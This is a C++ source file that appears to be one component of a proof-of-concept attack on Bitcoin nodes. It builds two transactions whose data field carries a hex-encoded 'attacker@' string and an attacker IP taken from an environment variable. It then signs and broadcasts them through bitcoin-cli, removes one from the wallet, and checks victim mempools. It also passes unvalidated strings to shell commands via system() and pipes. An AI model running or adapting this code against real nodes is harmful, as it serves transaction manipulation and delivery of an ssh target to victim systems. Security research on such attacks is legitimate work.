#include "CTransactionHandler.h"

std::pair<std::string, std::string>
CTransactionHandler::createSignedTransactions(std::ostringstream &tx1Oss, std::ostringstream &tx2Oss) {
    //Get IP address of attacker and prepare the address for ssh.
    std::string attackerIP = getenv("IP_ATTACKER"), attackerInfo("attacker@");
    std::ostringstream sshTargetHexOss;

    //Code both the attackerInfo and attackerIP as hexadecimal - it will be included in transaction to the victim as data segment and must be encoded as hex.
    for (const char &c: attackerInfo) {
        sshTargetHexOss << std::hex << int(c);
    }

    for (const char &c: attackerIP) {
        sshTargetHexOss << std::hex << int(c);
    }

    //Append encoded information as data segment to both transactions.
    tx1Oss << ", \"data\": \"" << sshTargetHexOss.str() << "\"}\'";
    tx2Oss << ", \"data\": \"" << sshTargetHexOss.str() << "\"}\'";

    //Sign both created transactions and save outputs.
    redi::ipstream tx1UnsignedHashOutput(tx1Oss.str(), redi::pstreams::pstdout);
    redi::ipstream tx2UnsignedHashOutput(tx2Oss.str(), redi::pstreams::pstdout);

    std::string tx1UnsignedHash, tx2UnsignedHash;
    std::getline(tx1UnsignedHashOutput, tx1UnsignedHash);
    std::getline(tx2UnsignedHashOutput, tx2UnsignedHash);

    tx1Oss.str("");
    tx1Oss << "bitcoin-cli signrawtransactionwithwallet " << tx1UnsignedHash;
    tx2Oss.str("");
    tx2Oss << "bitcoin-cli signrawtransactionwithwallet " << tx2UnsignedHash;

    redi::ipstream tx1SignedOutput(tx1Oss.str(), redi::pstreams::pstdout);
    redi::ipstream tx2SignedOutput(tx2Oss.str(), redi::pstreams::pstdout);

    //Parse outputs as JSON file.
    tx1Oss.str("");
    tx2Oss.str("");
    std::string line;
    while (std::getline(tx1SignedOutput, line)) {
        tx1Oss << line;
        //We can parse both outputs at once, both outputs should ALWAYS have the same number of lines if processed correctly.
        std::getline(tx2SignedOutput, line);
        tx2Oss << line;
    }

    nlohmann::json tx1SignedJson = nlohmann::json::parse(tx1Oss.str()), tx2SignedJson = nlohmann::json::parse(
            tx2Oss.str());

    //Parse hashes of the signed transactions.
    return std::make_pair(tx1SignedJson["hex"], tx2SignedJson["hex"]);
}

std::string CTransactionHandler::sendTransaction(const std::string &signedTransactionHex) {
    //maxfee parameter is set to [100] to silence possible error, it has no real influence on the outcome of the PoC, except for preventing error.
    std::ostringstream oss;
    oss << "bitcoin-cli sendrawtransaction " << signedTransactionHex << " 100";
    redi::ipstream txSendOutput(oss.str().c_str(), redi::pstream::pstdout);

    //Parse the output to get txid of the sent transaction.
    std::string txid;
    std::getline(txSendOutput.out(), txid);

    return txid;
}

void CTransactionHandler::deleteTransaction(const std::string txid) {
    //Remove transaction from the mempool.
    std::ostringstream deleteTxOss;
    deleteTxOss << "bitcoin-cli removeprunedfunds " << txid;
    system(deleteTxOss.str().c_str());
}

void CTransactionHandler::printTransaction(const std::string function, const std::string &searchedTxid) {
    //Issue listtransactions on desired victim node.
    redi::ipstream out(function, redi::pstream::pstdout);

    //Parse output as JSON.
    std::ostringstream oss;
    std::string line;
    while (std::getline(out.out(), line)) {
        oss << line;
    }

    nlohmann::json json = nlohmann::json::parse(oss.str());

    //Search all listed transactions for the desired one.
    bool flag = false;
    for (size_t i = 0; i < json.size(); ++i) {
        //If the listed transaction fits, print information about it.
        if (json[i]["txid"] == searchedTxid) {
            flag = true;
            std::cout << json[i].dump(15) << std::endl;
        }
    }

    //If the transaction was not found, display special message.
    if (!flag) {
        std::cout << rang::fg::yellow << rang::style::bold << "Transaction of ID [" << searchedTxid
                  << "] no longer exists in the mempool!" << rang::style::reset << std::endl;
    }
}

void CTransactionHandler::printTransactions(const std::string printName1, const std::string printName2,
                                            const std::string listFunction1, const std::string listFunction2,
                                            const std::string &sentTxid1, const std::string &sentTxid2) {
    std::cout << rang::style::bold << rang::fg::blue << printName1 << rang::style::reset << std::endl;

    printTransaction(listFunction1, sentTxid1);

    std::cout << rang::style::bold << rang::fg::magenta << printName2 << rang::style::reset << std::endl;

    printTransaction(listFunction2, sentTxid2);

    std::cout << rang::style::bold << rang::fg::gray << "-----------------------------------------------------"
              << rang::style::reset << std::endl;

}

